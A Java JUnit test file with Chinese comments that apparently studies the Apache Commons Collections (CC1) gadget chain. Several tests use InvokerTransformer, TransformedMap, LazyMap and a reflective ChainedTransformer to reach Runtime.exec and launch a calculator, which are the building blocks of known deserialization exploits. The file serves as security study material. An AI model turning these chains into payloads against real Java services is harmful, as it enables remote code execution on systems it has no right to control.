package com.pwjcw.test;

import org.apache.commons.collections.OrderedMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.LinkedMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.util.HashMap;
import java.util.Map;

public class TestCC01 {

    /**
     * 测试一下commons collections的功能
     */
    @Test
    public void testcc(){
        OrderedMap map=new LinkedMap();
        map.put("one","111");
        map.put("two",222);
        map.put("three",333);
        map.put("four",444);
        for (Object key:map.keySet()){
            System.out.println(key+":"+map.get(key));
        }
    }

    /**
     * 测试transform方法是否能进行执行任意命令
     */
    @Test
    public void testtransform(){
        //首先构造一个Runtime对象
        Runtime runtime = Runtime.getRuntime();
        //设置InvokerTransformer构造方法的参数
        String MethodName="exec";
        Class[] paramTypes=new Class[]{String.class};
        Object[] arg=new Object[]{"calc"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);
        //调用方法，传入Runtime对象
        invokerTransformer.transform(runtime);
    }

    /**
     * 测试TransformedMap类里面的checkSetValue方法
     */

    @Test
    public void testTranformMapWithcheckSetValue() {
        //构造TransformedMap.decorate方法的参数
        Map map=new HashMap();
        map.put("key","value");
        //构造keyTransformer参数,keyTransformer是InvokerTransformer的实例化的对象
        Runtime runtime = Runtime.getRuntime();
        String MethodName="exec";
        Class[] paramTypes=new Class[]{String.class};
        Object[] arg=new Object[]{"calc"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);

        //调用decorate方法，传入参数 ,返回一个tranformedmap
        Map<Object,Object> tranformedmap = TransformedMap.decorate(map,null,invokerTransformer);

        //遍历tranformedmap，调用setValue方法--->TransformedMap.checkSetValue方法-->InvokerTransformer.transform方法--->Runtime.exec方法
        for (Map.Entry entry:tranformedmap.entrySet()){
            entry.setValue(runtime);
        }
    }
    //下面这个测试类是上面的简化版本
    @Test
    public void test4(){
        Map hashMap = new HashMap();
        Map transformedmap = TransformedMap.decorate(hashMap, null, new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}));
        //TransformedMap.transformValue方法，TransformedMap.transformValue调用valueTransformer.transform(object)方法,object是Runtime对象,valueTransformer是InvokerTransformer对象，最终调用InvokerTransformer.transform方法，传递Runtime对象
        transformedmap.put("key",Runtime.getRuntime());

    }
    //通过以Value参数的方式传入Runtime对象，那么需要将ValueTransformer设置为InvokerTransformer对象，最终调用InvokerTransformer.transform方法，传递Runtime对象
    @Test
    public void test5(){
        Map hashMap=new HashMap();
        Map decorate = TransformedMap.decorate(hashMap, new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),null);
        decorate.put(Runtime.getRuntime(),"value");
    }

    //链式操作
    @Test
    public void test6(){
        //构造执行链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        //创建chainedtransformer对象，封装transformers执行链
        ChainedTransformer chain = new ChainedTransformer(transformers);
        //创建map对象，并设置触发条件
        Map<Object, Object> innerMap = new HashMap<>();
        innerMap.put("value", "value");
        chain.transform(innerMap);
    }
    //lazymap 利用
    @Test
    public void test7(){
        //创建一个tranformer对象，用来执行命令
        //首先构造一个Runtime对象
        Runtime runtime = Runtime.getRuntime();
        //设置InvokerTransformer构造方法的参数
        String MethodName="exec";
        Class[] paramTypes=new Class[]{String.class};
        Object[] arg=new Object[]{"calc"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);
        //创建一个map，将其key为空
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        objectObjectHashMap.put(null,Runtime.class);
        //调用decorate方法，传入map和transformer对象，得到一个lazymap对象
        Map decorate = LazyMap.decorate(objectObjectHashMap, invokerTransformer);
        //调用laymap的get方法，传入Runtime对象，最终会执行invokerTransformer.transform方法，传入Runtime对象
        decorate.get(runtime);
    }
}


